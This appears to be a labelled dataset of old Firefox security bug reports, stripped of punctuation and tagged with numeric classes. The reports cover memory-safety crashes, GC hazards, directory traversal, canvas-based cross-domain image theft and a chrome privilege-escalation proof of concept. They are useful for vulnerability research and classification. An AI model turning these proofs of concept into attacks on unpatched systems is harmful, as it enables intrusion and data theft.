crash when zooming this is derived from bug 346405 the test case at still crashes even though the core bug for 346405 we ll need to fix this separately steps to reproduce 1 load 2 zoom a couple of times with control result crash dan notes the following details for the crash this is a deleted object at nscachedstyledata getstyledata line 210 c nsstylecontext getstyledata line 248 c nsiframe getstyledata line 612 c nsiframe getstyletextreset line 88 c nslinelayout verticalalignframes line 2146 c nslinelayout reflowframe line 1181 c nsinlineframe reflowinlineframe line 761 c nsinlineframe reflowframes line 596 c nsinlineframe reflow line 489 c nslinelayout reflowframe line 995 c nsinlineframe reflowinlineframe line 761 c nsinlineframe reflowframes line 596 c nsfirstlineframe reflow line 1151 c nslinelayout reflowframe line 995 c nsblockframe reflowinlineframe line 4060 c nsblockframe doreflowinlineframes line 3899 c nsblockframe reflowinlineframes line 3780 c nsblockframe reflowline line 2773 c nsblockframe reflowdirtylines line 2303 c nsblockframe reflow line 904 c nscontainerframe reflowchild line 909 c nscolumnsetframe reflowchildren line 484 c nscolumnsetframe reflow line 744 c nsblockreflowcontext reflowblock line 605 c nsblockframe reflowblockframe line 3494 c nsblockframe reflowline line 2653 c nsblockframe reflowdirtylines line 2303 c nsblockframe reflow line 904 c nsblockreflowcontext reflowblock line 605 c nsblockframe reflowblockframe line 3494 c nsblockframe reflowline line 2653 c nsblockframe reflowdirtylines line 2303 c nsblockframe reflow line 904 c nscontainerframe reflowchild line 909 c canvasframe reflow line 536 c nscontainerframe reflowchild line 909 c nshtmlscrollframe reflowscrolledframe line 515 c nshtmlscrollframe reflowcontents line 570 c nshtmlscrollframe reflow line 768 c nscontainerframe reflowchild line 909 c viewportframe reflow line 239 c presshell stylechangereflow line 3549 c nsprescontext clearstyledataandreflow line 625 c nsprescontext settextzoominternal line 426 c nsprescontext settextzoom line 429 c documentviewerimpl settextzoom line 2728 c xptc_invokebyindex line 102 c xpcwrappednative callmethod line 2169 c xpcwrappednative setattribute line 1968 c xpc_wn_gettersetter line 1479 c js_invoke line 1379 c js_internalinvoke line 1473 c js_internalgetorset line 1544 c js_nativeset line 3521 c js_interpret line 3709 c js_invoke line 1398 c js_internalinvoke line 1473 c js_internalgetorset line 1544 c js_setproperty line 3715 c js_interpret line 3709 c js_invoke line 1398 c js_internalinvoke line 1473 c js_callfunctionvalue line 4353 c nsjscontext calleventhandler line 1493 c nsjseventlistener handleevent line 186 c nseventlistenermanager handleeventsubtype line 1655 c nseventlistenermanager handleevent line 1762 c nsxulelement handledomevent line 2233 c nsxulelement handledomevent line 2038 c nsxblprototypehandler executehandler line 397 c nsxblwindowhandler walkhandlersinternal line 347 c nsxblwindowkeyhandler walkhandlers line 199 c nsxblwindowkeyhandler keypress line 254 c dispatchtointerface line 144 c nseventlistenermanager handleevent line 1752 c nsxuldocument handledomevent line 1241 c nsxulelement handledomevent line 2261 c nsxulelement handledomevent line 2255 c nsxulelement handledomevent line 2255 c nsxulelement handledomevent line 2255 c nsxulelement handledomevent line 2255 c nsxulelement handledomevent line 2255 c nsxulelement handledomevent line 2255 c nsxulelement handledomevent line 2255 c nsxulelement handledomevent line 2255 c nsxulelement handlechromeevent line 2899 c nsglobalwindow handledomevent line 1757 c nsdocument handledomevent line 4146 c nsgenericelement handledomevent line 2269 c presshell handleeventinternal line 6574 c presshell handleevent line 6356 c nsviewmanager handleevent line 2519 c nsviewmanager dispatchevent line 2253 c handleevent line 171 c nswindow dispatchevent line 1319 c nswindow dispatchwindowevent line 1339 c nswindow dispatchkeyevent line 3639 c nswindow onkeydown line 3782 c nswindow processmessage line 4777 c nswindow windowproc line 1507 c reproduced in mozilla/5.0 windows u windows nt 5.1 en-gb rv:1.8.1.12 gecko/2008020121 firefox/2.0.0.12 someone should give this a fancy title	11
gc hazard in js_compileucfunctionforprincipals js_compileucfunctionforprincipals contains the following code jsfunction fun fun js_newfunction cx null null 0 jsfun_interpreted obj funatom if js_compilefunctionbody cx fun principals chars length filename lineno if obj funatom obj_define_property cx obj atom_to_jsid funatom object_to_jsval fun object null null jsprop_enumerate null fun null last_frame_checks cx fun return fun here js_newfunction creates a function rooted only via the newborn array if the supplied source contains other function objects then when the compiler allocates them they displace the fun from the newborn array and unroot it then any last-ditch gc during the compilation later would collect the live pointer before the bug 404935 and on 1.8.1 branch the problem was not that bad as a pseudo-frame that the compiler creates would root fun during the compilation still after js_compilefunctionbody returns obj_define_property would be called with unrooted fun or when obj is null the unrooted value would be returned to the caller	11
js_valuetoid cx jsval_null should return atom for null string consider the following test case var obj null 1 var errors if obj.hasownproperty null errors.push null property is not owned if obj.propertyisenumerable null errors.push null property is not enumerable var getter_was_called false obj.__definegetter null function getter_was_called true return 1 obj null if getter_was_called errors.push getter was not assigned to the null property var setter_was_called false obj.__definesetter null function setter_was_called true obj null 2 if setter_was_called errors.push setter was not assigned to the null property if errors.length throw n'+errors.join n gc when i run the test case with the shell i got m/trunk/mozilla/js/src js m/y.js uncaught exception null property is not owned null property is not enumerable getter was not assigned to the null property setter was not assigned to the null property segmentation fault the reason for the exceptions which also exists on 1.8.1 branch is that the test case triggers invocation of js_valuetoid with the id set to null currently the function will return it as-is due to the jsval_is_object check done for xml support when the expected behavior is to return the id for null atom hence the test cases will not find the id when looking for the property the reason for the segmentation fault which does not exist on 1.8.1 branch is uncler in principle the code should tolerate the scope properties with null as an id but apparently this is not the case so i mark the bug as sensitive one until i figure out the reason behind the crash	11
missing save_sp_and_pc in store number|int|uint the macros store number|int|uint from jsinterp.c do not call save_sp_and_pc before calling potentially gc-triggering js_newdoublevalue this leads to a gc hazard as demonstrated with the following example m/ff/mozilla/js/src cat m/y.js var expect f gczeal 2 var actual f if expect actual throw hazard actual actual expect expect function f var a 1e10 var b 2e10 var c 3e10 return a 2 b 2 c m/ff/mozilla/js/src linux_all_dbg.obj/js m/y.js uncaught exception hazard actual=1.44e+42 expect=2.4e+31 note that so far i was not able to discover a way to get a crash with that but it can be used to read a memory image of allocated structs	11
missing save_sp_and_pc in jsop_neg jsop_neg in the interpreter calls js_newnumbervalue without calling save_sp_and_pc when the top of the stack is a double value this leads to a gc hazard as the following example demonstrates m/ff/mozilla/js/src cat m/y.js function f a b c return a b c var expect f 1.5 1.25 1.125 gczeal 2 var actual f 1.5 1.25 1.125 if actual expect throw gc hazard expect expect actual actual m/ff/mozilla/js/src linux_all_dbg.obj/js m/y.js uncaught exception gc hazard expect=-2.109375 actual=-1.58203125	11
throw from xml filter leaves pending block objects unput currently js_filterxmllist after calling js_interpret resets the scope chain without calling js_putblockobject on the pending block objects left from a thrown exception the following demonstrates the problem m/ff/mozilla cat m/y.js var g function f try a b let a=1 b 2 c 3 g function a b+c return a xxx catch e f var actual g if actual 6 throw bad result uneval actual m/ff/mozilla m/ff/mozilla/js/src/linux_all_dbg.obj/js m/y.js segmentation fault	11
missed save_sp_and_pc in jsop_yield here is the jsop_yield case from js_interpret begin_case jsop_yield assert_not_throwing cx if frame_to_generator fp state jsgen_closing js_reportvalueerror cx jsmsg_bad_generator_yield jsdvg_search_stack fp argv 2 null ok js_false goto out fp rval fetch_opnd 1 fp flags jsframe_yielding pc jsop_yield_length save_sp_and_pc fp here save_sp_and_pc fp is not called before reporting an error as such a freshly allocated gc thing on the stack may become unrooted leading to a gc hazard if a gc is triggered twice during js_reportvalueerror	11
assertion failure fp in jsobj.c js1_7/extensions/regress-353249.js js1_7/regress/regress-352797-02.js assertion failure fp at js/src/jsobj.c:2004 sensitive since bug 416705 is	11
printing crash nscellmap getcellinfoat exception exc_bad_instruction user-agent mozilla/5.0 macintosh u intel mac os x en-us rv:1.8.1.3 gecko/20070309 firefox/2.0.0.3 build identifier mozilla/5.0 macintosh u intel mac os x en-us rv:1.8.1.3 gecko/20070309 firefox/2.0.0.3 firefox crashes every time with an exc_bad_instruction exception when trying to print a particular page from intuit.com a product order page the original page is from intuit.com a web complete source page and supporting images etc are attached to this bug the crash is 100 reproducible with this page content on macos x 10.4.9 with firefox 2.0.0.3 20070309 reproducible always steps to reproduce 1 using firefox 2.0.0.3 20070309 2 open the attached edit_confirmation.html file 3 once open click on the print this page icon/link on the page 4 when the os print dialog comes up select print actual results firefox crashes after you have clicked print and the print dialog has been dismissed exception exc_bad_instruction expected results firefox should successfully print the page this sample page content prints fine on windows vista with firefox 2.0.0.3 20070309 attached is a sample order_confirmation.xps of the page output from windows vista	11
crash nscssframeconstructor findframewithcontent with xul trees position fixed thread 0 crashed reading memory at 0 nscssframeconstructor findframewithcontent nsframemanager nsiframe nsicontent nsicontent nsfindframehint 372 nscssframeconstructor.cpp:10773 1 nscssframeconstructor findprimaryframefor nsframemanager nsicontent nsiframe nsfindframehint 237 nscssframeconstructor.cpp:10865 2 nsframemanager getprimaryframefor nsicontent int 538 nsframemanager.cpp:394 3 presshell getprimaryframefor nsicontent const 42 nspresshell.cpp:4688 4 nsboxobject getframe int 102 nsboxobject.cpp:141 5 nstreeboxobject gettreebody 53 nstreeboxobject.cpp:116 6 nstreeboxobject getcolumns nsitreecolumns 17 nstreeboxobject.cpp:234 7 nstreecolframe invalidatecolumns 96 nstreecolframe.cpp:228 8 nstreecolframe destroy 17 nstreecolframe.cpp:103 9 nsframelist destroyframes 48 nsframelist.cpp:68 10 nscontainerframe destroy 73 nscontainerframe.cpp:255	11
crash nsstylecontext getstyledisplay while trying to print see testcase when clicking on the print button and then printing something current trunk builds of mozilla crash 0 xul.dll nsiframe getstyledisplay nsstylestructlist.h:95 1 xul.dll nscssrendering paintbackgroundwithsc mozilla/layout/base/nscssrendering.cpp:3448 2 xul.dll tablebackgroundpainter paintcell mozilla/layout/tables/nstablepainter.cpp:634 3 xul.dll tablebackgroundpainter paintrow mozilla/layout/tables/nstablepainter.cpp:590 4 xul.dll tablebackgroundpainter paintrowgroup mozilla/layout/tables/nstablepainter.cpp:530 5 xul.dll tablebackgroundpainter painttable mozilla/layout/tables/nstablepainter.cpp:446 6 xul.dll nstableframe painttableborderbackground mozilla/layout/tables/nstableframe.cpp:1469 7 xul.dll nsdisplaytableborderbackground paint mozilla/layout/tables/nstableframe.cpp:1318 8 xul.dll nsdisplaylist paint mozilla/layout/base/nsdisplaylist.cpp:296 9 xul.dll nslayoututils paintframe mozilla/layout/base/nslayoututils.cpp:988 10 xul.dll nspageframe paintpagecontent mozilla/layout/generic/nspageframe.cpp:562 11 xul.dll paintpagecontent mozilla/layout/generic/nspageframe.cpp:403 12 xul.dll nsdisplaygeneric paint mozilla/layout/base/nsdisplaylist.h:862 13 xul.dll nsdisplaylist paint mozilla/layout/base/nsdisplaylist.cpp:296 14 xul.dll nslayoututils paintframe mozilla/layout/base/nslayoututils.cpp:988 15 xul.dll nssimplepagesequenceframe printnextpage mozilla/layout/generic/nssimplepagesequence.cpp:647 16 xul.dll nsprintengine printpage mozilla/layout/printing/nsprintengine.cpp:2368 17 xul.dll nspageprinttimer notify mozilla/layout/printing/nspageprinttimer.cpp:90 18 xul.dll nstimerimpl fire mozilla/xpcom/threads/nstimerimpl.cpp:403 19 xul.dll nstimerevent run mozilla/xpcom/threads/nstimerimpl.cpp:490 20 xul.dll nsthread processnextevent mozilla/xpcom/threads/nsthread.cpp:510 21 xul.dll nsbaseappshell run mozilla/widget/src/xpwidgets/nsbaseappshell.cpp:170 22 nspr4.dll pr_getenv 23 firefox.exe wmain mozilla/toolkit/xre/nswindowswmain.cpp:87 24 firefox.exe firefox.exe 25 kernel32.dll baseprocessstart	11
invalid getter usage or assertion failure with var x x getter function js function var x x getter function opt typein:1 syntaxerror invalid getter usage why debug assertion failure 0 at jsinterp.c:5128	11
crash during gc after uneval involves e4x mysterious sharp variable js www x y x print uneval this n gc www 1 x y x exception exc_bad_access codes kern_invalid_address at thread 0 crashed 0 js js_getgcthingflags 26 jsgc.c:512 1 js js_calltracer 495 jsgc.c:2146 2 js js_traceobject 811 jsobj.c:4898 3 js js_tracechildren 140 jsgc.c:1812 4 js js_calltracer 777 jsgc.c:2172 5 js js_traceobject 811 jsobj.c:4898 6 js js_tracechildren 140 jsgc.c:1812 7 js js_calltracer 777 jsgc.c:2172 8 js js_tracestackframe 355 jsgc.c:2333 9 js js_tracecontext 124 jsgc.c:2445 10 js js_traceruntime 179 jsgc.c:2519 11 js js_gc 530 jsgc.c:2747 12 js js_gc 96 jsapi.c:2372 13 js gc 45 js.c:742 14 js js_invoke 2945 jsinterp.c:1332 15 js js_interpret 62065 jsinterp.c:4025 16 js js_execute 715 jsinterp.c:1591 17 js js_executescript 54 jsapi.c:4692 18 js process 912 js.c:268 19 js processargs 2045 js.c:519 20 js main 612 js.c:3256 21 js start 216 22 js start 41	11
yet another gc hazard with in js_interpret the current implementation of and operators in js_interpret to increase/decrease indexed property of an object does not root the id of the property this leads to a gc hazard when code tries to save the result back into object as the following example demonstrates m/ff/mozilla/js/src cat m/y.js var obj var id tostring function return math.pow 2 0.1 obj id valueof unrooter print obj id gc print uneval obj function unrooter delete obj id gc return 10 m/ff/mozilla/js/src m/ff/mozilla/js/src/linux_all_opt.obj/js m/y.js before 16384 after 16384 break 09ffc000 10 before 16384 after 16384 break 09ffc000 segmentation fault	11
1.8 branch crash js_atomtoprintablestring i found this bug and reduced it jesse ruderman helped to reduce it even more till 012345 definesetter 5 function this command crashes at js_atomtoprintablestring with address it does not crash trunk js shell	11
xslt creates documents which do n't have script handling objects this may cause similar problems as bug 393761 and bug 393762	2
document.loadbindingdocument returns a document that does not have a script handling object this is similar to bug 448548 this is fx2-only on fx2 document.loadbindingdocument returns a document that does not have a script handling object on trunk and fx3.0.x it does not return anything	2
potential sign problems in nsescapecount potential sign problems in nsescapecount 76 76 static char nsescapecount 77 const char str 78 print32 len 79 nsescapemask flags 80 print32 out_len 81 82 83 if str 84 return 0 85 86 int i extra 0 87 static const char hexchars 0123456789abcdef 88 89 register const unsigned char src const unsigned char str 90 for i 0 i len i 91 92 if is_ok src 93 extra 2 the escape plus an extra byte for each nibble 94 95 96 char result char nsmemory alloc len extra 1 a potentia issue here probably exploitable on 64 bit systems 1 76 and 86 are signed if len 1 31 the loop is not entered and 96 allocates just 1 31 1 luckily positive to avoid sign promotion 2 for len about 1365mb and always doing 2 the allocation evaluates to zero meaning trouble for len sign also causes trouble potential exploit via feeding a string via the gopher protocol seems unfeasible does n't succeed after 12 hours on a maching with 1.5g ram proposed solution fixing the sign and checking for overflow of extra 2	9
sm jsxml.c assumes that namespace and qname are read-only jsxml.c contains 3 fragments like nsobj callconstructorfunction cx obj js_namespaceclass.base 1 vp 2 nameobj callconstructorfunction cx obj js_qnameclass.base 1 name if nameobj return js_false with callconstructorfunction defined as static jsobject callconstructorfunction jscontext cx jsobject obj jsclass clasp uintn argc jsval argv if js_callfunctionname cx obj clasp name argc argv rval return null js_assert jsval_is_primitive rval return jsval_to_object rval here the code assumes that namespace and qname at the global scope point to the default native constructors since both namespace and qname are not read-only this can be trivially used to crush the engine on a de-reference of a script-supplied address m/20-ff/js/src cat s/x.js var x xml namespace function return 10 x.addnamespace x m/20-ff/js/src linux_all_opt.obj/js s/x.js segmentation fault	9
npapi/npruntime possible crash when returning a new npobject as the result of an invoke/invokedefault/getproperty user-agent mozilla/5.0 windows u windows nt 5.1 en-us rv:1.9 gecko/2008052906 firefox/3.0 build identifier mozilla/5.0 windows u windows nt 5.1 en-us rv:1.8.1.15 gecko/2008062306 firefox/2.0.0.15 from modules/plugin/base/src/nsjsnpruntime.cpp:1297 in the nsnpobjwrapper getneworused function npobjwrapperhashentry entry ns_static_cast npobjwrapperhashentry pl_dhashtableoperate snpobjwrappers npobj pl_dhash_add if entry out of memory js_reportoutofmemory cx return nsnull if pl_dhash_entry_is_busy entry entry mjsobj found a live npobject wrapper return it return entry mjsobj entry mnpobj npobj entry mnpp npp no existing jsobject create one jsobject obj js_newobject cx snpobjectjswrapperclass nsnull nsnull if obj oom remove the stale entry from the hash pl_dhashtablerawremove snpobjwrappers entry return nsnull onwrappercreated entry mjsobj obj the entry variable is a pointer to an entry inside the data storage of the global snpobjwrappers hash table the problem is that the js_newobject line 1318 may trigger a javascript garbage collection that can in turn finalize some npobject removing them from the snpobjwrappers hash table that process can re-allocate the storage of the hash table making the entry point to released memory crashing the process when accessed in the line 1330 or worse pointing to re-allocated memory hence corrupting data this bug was reproduced fairly reliably on firefox 2.0.0.15 that code snippet looks similar in firefox 3 suggesting the bug is probably still present unless js_newobject ca n't trigger the javascript garbage collector i do n't have a repro test case sample plug-in available currently but i can probably write one if necessary it is not clear if specific allocation/garbage collection patterns make this bug easier to reproduce reproducible sometimes steps to reproduce 1 write a npapi plug-in that has a function that creates and returns a new npobject every time it is called 2 call that function many times from javascript actual results eventually firefox will crash expected results no crash	9
fix for bug 367428 lets through escaped slashes on linux windows too on trunk steps to reproduce 1 open browser on linux 2 load resource 2f 2f 2f in it expected results do n't see file list for an ancestor of the install directory actual results i m looking at a listing of bzbarsky since the browser is installed under bzbarsky/mozilla/nightly/install-dir	9
resource directory traversal vulnerability user-agent mozilla/5.0 macintosh u ppc mac os x mach-o it rv:1.8.1.6 gecko/20070725 firefox/2.0.0.6 build identifier mozilla/5.0 macintosh u ppc mac os x mach-o it rv:1.8.1.6 gecko/20070725 firefox/2.0.0.6 classical traversal vulnerability maybe someone forgot some filters it could be dangerous if someone open a well forged page reproducible always steps to reproduce 1.write this resource 2e 2e without in your ur 2 3 actual results you can navigate your file system expected results the software forgets some filters in resource procedure	9
stealing pictures via canvas and http redirect stealing pictures via canvas and http redirect using a canvases drawimage todataurl and an image that is redirected via the http protocolit is possible to get the content of arbitrary accessible http images affects both trunk and 2.0 branch testcase to follow	5
redirects permit cross-domain and local-system image disclosure via canvas hi chris evans cc ed found out that the security restrictions applied to canvas todataurl and getimagedata methods once drawimage is called on a given canvas to render a non-same-origin image may be trivially bypassed if image source is initially specified in src attribute to be same-origin but then http 30x redirected to a non-same-origin resource this permits theft of potentially sensitive data across domains should the victim be logged into any services that either store private images or provide any sensitive visualisations at predictable locations just as amusingly i noticed that this may be exploited to very accurately enumerate locally installed software and effectively fingerprint the computer by abusing moz-icon as a redirection target works in ff2 on windows according to chris this does not affect ff3	5
crash nstreebodyframe setview with onoverflow doing stuff and tree and treechildren see testcase which crashes current trunk build on load it does n't crash in a 2007-06-11 build but does crash in a 2007-06-12 build i guess a regression from bug 381120 0 xul.dll nstreebodyframe setview mozilla/layout/xul/base/src/tree/src/nstreebodyframe.cpp:548 1 xul.dll nstreebodyframe ensureview mozilla/layout/xul/base/src/tree/src/nstreebodyframe.cpp:420 2 xul.dll nstreebodyframe reflowfinished mozilla/layout/xul/base/src/tree/src/nstreebodyframe.cpp:456 3 xul.dll presshell handlepostedreflowcallbacks mozilla/layout/base/nspresshell.cpp:4498 4 xul.dll presshell diddoreflow mozilla/layout/base/nspresshell.cpp:6240 5 xul.dll presshell processreflowcommands mozilla/layout/base/nspresshell.cpp:6428 6 xul.dll presshell doflushpendingnotifications mozilla/layout/base/nspresshell.cpp:4601 7 xul.dll presshell flushpendingnotifications mozilla/layout/base/nspresshell.cpp:4541 8 xul.dll documentviewerimpl loadcomplete mozilla/layout/base/nsdocumentviewer.cpp:946 9 xul.dll nsdocshell endpageload mozilla/docshell/base/nsdocshell.cpp:5063 10 xul.dll nswebshell endpageload mozilla/docshell/base/nswebshell.cpp:1013 11 xul.dll nscomptr_base assign_from_qi nscomptr.cpp:96 12 xul.dll nsdocshell onstatechange mozilla/docshell/base/nsdocshell.cpp:4968	11
crash nslistboxbodyframe oncontentremoved loading the testcase makes mac trunk debug firefox crash nslistboxbodyframe oncontentremoved mcontent and mrowcount are both so i m guessing this is a deleted nslistboxbodyframe	11
fix shutdown crash pl_dhashtablefinish with high surrogate in style mozilla/5.0 macintosh u intel mac os x 10.4 en-us rv:1.9.1a1pre gecko/2008061310 minefield/3.1a1pre loading the testcase and then quitting firefox cmd+q usually results in a crash pl_dhashtablefinish calling a random address pl_dhashtablefinish calling atomtableclearentry which dereferences a random address the problem clearly starts with bug 316338 but i think there s a recent regression in how the style system or the atom table deals with it	11
assertion running past end with moz-column pre-wrap inline-block loading the testcase triggers assertion should n't be incomplete if availableheight is unconstrained areflowstate.availableheight ns_unconstrainedsize file mozilla/layout/generic/nsblockframe.cpp line 1411 assertion running past end mcurrent mlistlink file mozilla/layout/base generic/nslinebox.h line 611 the second assertion is usually followed by heap corruption so i m filing this bug as security sensitive i have it set to abort locally	11
wide xul button causes nsnativethemecocoa drawcellwithscaling to autorelease a freed object version trunk debug build on leopard loading the testcase causes a malloc error ca n't allocate region perhaps bug 435223 and then objc 20992 freed id message autorelease sent to freed object the malloc error does n't bother me too much but touching freed objects is pretty bad in fact with mallocscribble enabled firefox dereferences instead of triggering the error message above	11
crash nsnativethemecocoa drawcellwithscaling with html input large letter-spacing exception type exc_bad_access sigsegv exception codes kern_invalid_address at crashed thread 0 thread 0 crashed 0 argb32_sample_argb32 383 1 argb32_image_mark 601 2 argb32_image 390 3 ripd_mark 326 4 ripl_bltimage 1299 5 ripc_renderimage 273 6 ripc_drawimage 4973 7 cgcontextdrawimage 397 8 nsnativethemecocoa drawcellwithscaling nscell cgcontext cgrect const nscontrolsize float float float float float const 3 4 int 2082 nsnativethemecocoa.mm:304 9 nsnativethemecocoa drawpushbutton cgcontext cgrect const int int int 1482 nsnativethemecocoa.mm:463 10 nsnativethemecocoa drawwidgetbackground nsirenderingcontext nsiframe unsigned char nsrect const nsrect const 2978 nsnativethemecocoa.mm:1116 related to bug 444260	11
crash nsnativethemecocoa drawpushbutton with huge word-spacing with mallocscribble enabled the testcase makes nsnativethemecocoa drawpushbutton dereference this might be related to other sg critical button-drawing bugs bug 444864 bug 444260 or it might be related to bug 410415 which has a matching crash signature but comes from a real-world site and is not marked as sg critical before the crash i see firefox-bin 81663 malloc mmap size=2147487744 failed error code=12 error ca n't allocate region set a breakpoint in malloc_error_break to debug mon aug 4 15:39:44 firefox-bin 81663 error cgbitmapcontextinfocreate unable to allocate 2147484480 bytes for bitmap data mon aug 4 15:39:44 firefox-bin 81663 error cgcontexttranslatectm invalid context	11
crash nsframemanager captureframestatefor with moz-column float loading the testcase triggers an assertion and a crash assertion must only be called on reflowed lines getstatebits ns_frame_is_dirty file users/jruderman/central/layout/generic/nsframe.cpp line 4071 crash at one of the following nsframemanager captureframestatefor nscontainerframe positionchildviews nsframelist checkforloops some of the crashes look exploitable	11
fix assertion child not in controls and other badness steps to reproduce 1 load the testcase 2 close the window or for better reproducibility quit result crash nsdefaultcomparator during js_gc or assertion child not in controls index controls.noindex file nshtmlformelement.cpp line 1464 assertion invalid start index count 0 start length file nstarray.h line 597 often followed by various other assertions malloc complaints such as incorrect checksum for freed object crashes etc	11
assertion comparing iterators over different lists with moz-column null character height loading the testcase in a trunk debug build triggers assertion comparing iterators over different lists mlistlink aother.mlistlink file users/jruderman/central/layout/base generic/nslinebox.h line 690 abort running past end mcurrent mlistlink file users/jruderman/central/layout/base generic/nslinebox.h line 611 the abort usually indicates heap corruption this testcase makes nightlies hang rather than crash but i m filing as security-sensitive to be on the safe side gary kwong did the hard part of finding a reproducible testcase triggering the bug i just did the easy part of reducing it	11
fix assertion unexpected second call to setinitialchildlist and more with xslt steps to reproduce 1 save the attachments as b3.html and inner.xhtml 2 open b3.html result assertion initial containing block already created nsnull minitialcontainingblock file users/jruderman/central/layout/base/nscssframeconstructor.cpp line 8745 assertion unexpected second call to setinitialchildlist not reached file users/jruderman/central/layout/generic/nscontainerframe.cpp line 111 assertion some objects allocated with allocateframe were not freed mframecount 0 file users/jruderman/central/layout/base/nspresshell.cpp line 676 security-sensitive for now because the last assertion scares me based on the crashtest for bug 428844 related to bug 61675	11
integer overflow in nsescape still this bug was initially created as a clone of bug 455987 this bug was initially created as a clone of bug 445117 bug 455987 tried to fix this but i added when i should have subtracted the size of the terminator in nsescapehtml2	11
urls containing are interpreted very oddly possible overflow bug user-agent mozilla/5.0 x11 u linux i686 en-us rv:1.8.1.12 gecko/20080129 iceweasel/2.0.0.12 debian-2.0.0.12-2 build identifier mozilla/5.0 x11 u linux i686 en-us rv:1.8.1.12 gecko/20080129 iceweasel/2.0.0.12 debian-2.0.0.12-2 this tag a href 1 32 space 32 here linky a genrates this link text htt yahoo.co/m/space 20space 20her there s a a at the beginning of that if you ca n't see it here what is wrong with this let me count the ways htt instead of http three slashes instead of two before yahoo slash in the middle of com missing e at the very end i m a c programmer and this smells like the kind of result that could spring from a potential buffer overflow bug however i have no evidence that an overflow is actually happening i tag this bug security out of caution btw this link works in outlook not that i would suggest for a second that you imitate outlook but that s why i was testing it reproducible always steps to reproduce 1 paste the above link tag into html 2 view it 3 copy link location from link actual results htt yahoo.co/m/space 20space 20her note leading a expected results possibly with leading a	9
xss by attaching a binding to an element in an unloaded document it s possible to use a binding to perform an xss attack in a similar way to bug 428672 and bug 433328	9
the fix in bug 451680 does not fix field the fix in bug 451680 does not fix field	9
proto of a function returned by components.lookupmethod comes from content this is similar to bug 370127 since proto of a function returned by components.lookupmethod comes from content it is unsafe to use properties and methods of that function if chrome code calls call or apply on that function then content code can run arbitrary code with chrome privileges by using array.prototype methods trick bug 344495 bug 344495 s trick is not required in some cases for example chrome var d content.document var s components.lookupmethod d title call d s s.substring s.indexof 1 content var s substring privileged_eval indexof function return code function.prototype.call function return s using components.lookupmethod with call or apply might be prevailing usage since there are many such examples in 1.7 branch code including xpcnativewrapper.js this means fx1.0.x and moz1.7.x are exploitable without any extensions but i m not sure if there are any vulnerable extensions on addons.mozilla.org	11
xpcnativewrapper pollution using top-level statement of chrome js user-agent build identifier please see bug 444077 and bug 441087 when a top-level statement is executed fp callee is null thus it s possible to circumvent the fix in bug 441087 reproducible always	11
crash with input type=file and events crash with input type=file and events changing the type of input from file to text while the file open dialog is open causes crash with signs of memory corruption the top of stack is ns_release and events are involved in the stack affects ff and seamonkey trunk ff 1.5 seems safe	11
crash nsinlineframe reflowframes with first-letter float binding pre and see testcase which crashes current trunk and branch builds on load since this also crashes on branch i m marking it security sensitive for now 0 nsinlineframe reflowframes nsprescontext nshtmlreflowstate const nsinlineframe inlinereflowstate nshtmlreflowmetrics unsigned int mozilla/layout/generic/nsinlineframe.cpp:460 1 nsinlineframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int mozilla/layout/generic/nsinlineframe.cpp:394 2 nslinelayout reflowframe nsiframe unsigned int nshtmlreflowmetrics int mozilla/layout/generic/nslinelayout.cpp:883 3 nsblockframe reflowinlineframe nsblockreflowstate nslinelayout nslinelist_iterator nsiframe linereflowstatus mozilla/layout/generic/nsblockframe.cpp:3573 4 nsblockframe doreflowinlineframes nsblockreflowstate nslinelayout nslinelist_iterator int linereflowstatus int mozilla/layout/generic/nsblockframe.cpp:3393 5 nsblockframe reflowinlineframes nsblockreflowstate nslinelist_iterator int mozilla/layout/generic/nsblockframe.cpp:3237 6 nsblockframe reflowline nsblockreflowstate nslinelist_iterator int mozilla/layout/generic/nsblockframe.cpp:2269 7 nsblockframe reflowdirtylines nsblockreflowstate mozilla/layout/generic/nsblockframe.cpp:1854 8 nsblockframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int mozilla/layout/generic/nsblockframe.cpp:940 9 nsblockreflowcontext reflowblock nsrect const int nscollapsingmargin int int nsmargin nslinebox nshtmlreflowstate unsigned int nsblockreflowstate mozilla/layout/generic/nsblockreflowcontext.cpp:339 10 nsblockframe reflowblockframe nsblockreflowstate nslinelist_iterator int mozilla/layout/generic/nsblockframe.cpp:2973 etc	11
crash nsstylecontext release on reload with mathml element and menupopup see testcase which crashes with current trunk build on reload this regressed on trunk between 2008-01-09 and 2008-01-10 regression from bug 404146 or bug 404192 0 1 nsstylecontext release nsstylecontext.h:92 2 nsframe nsframe mozilla/layout/generic/nsframe.cpp:350 3 nsareaframe scalar deleting destructor unsigned int 4 nsframe destroy mozilla/layout/generic/nsframe.cpp:510 5 nscontainerframe destroy mozilla/layout/generic/nscontainerframe.cpp:299 6 nsblockframe destroy mozilla/layout/generic/nsblockframe.cpp:314 7 nsframelist destroyframes mozilla/layout/generic/nsframelist.cpp:67 8 nscontainerframe destroy mozilla/layout/generic/nscontainerframe.cpp:257 9 nsframelist destroyframes mozilla/layout/generic/nsframelist.cpp:67 10 nscontainerframe destroy mozilla/layout/generic/nscontainerframe.cpp:257 11 nsframelist destroyframes mozilla/layout/generic/nsframelist.cpp:67 12 nscontainerframe destroy mozilla/layout/generic/nscontainerframe.cpp:257 13 nsframemanager destroy mozilla/layout/base/nsframemanager.cpp:283 14 presshell destroy mozilla/layout/base/nspresshell.cpp:1673 15 documentviewerimpl destroy mozilla/layout/base/nsdocumentviewer.cpp:1522 16 documentviewerimpl show mozilla/layout/base/nsdocumentviewer.cpp:1842 17 nsprescontext ensurevisible int mozilla/layout/base/nsprescontext.cpp:1449 18 presshell unsuppressandinvalidate mozilla/layout/base/nspresshell.cpp:4247 19 presshell unsuppresspainting mozilla/layout/base/nspresshell.cpp:4307 20 documentviewerimpl loadcomplete unsigned int mozilla/layout/base/nsdocumentviewer.cpp:1013 21 nsdocshell endpageload nsiwebprogress nsichannel unsigned int mozilla/docshell/base/nsdocshell.cpp:5031 22 nswebshell endpageload nsiwebprogress nsichannel unsigned int mozilla/docshell/base/nswebshell.cpp:1013 23 nsdocshell onstatechange nsiwebprogress nsirequest unsigned int unsigned int mozilla/docshell/base/nsdocshell.cpp:4931	11
